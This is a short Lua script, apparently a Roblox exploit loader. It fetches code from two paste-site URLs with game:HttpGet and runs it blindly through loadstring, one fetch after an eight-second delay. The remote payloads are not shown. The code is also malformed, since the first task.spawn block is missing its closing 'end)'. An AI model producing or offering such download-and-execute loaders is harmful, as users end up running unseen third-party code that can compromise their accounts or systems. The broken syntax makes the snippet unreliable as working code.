-- Run additional scripts concurrently
pcall(function()
    -- Script with delay to reduce freezing
    task.spawn(function()
        task.wait(8)
        loadstring(game:HttpGet("https://pastefy.app/WSK3A4e9/raw"))()
    -- Script that runs immediately
    task.spawn(function()
        loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/HYyF83MW2AqMAnmE/raw", true))()
    end)
end)

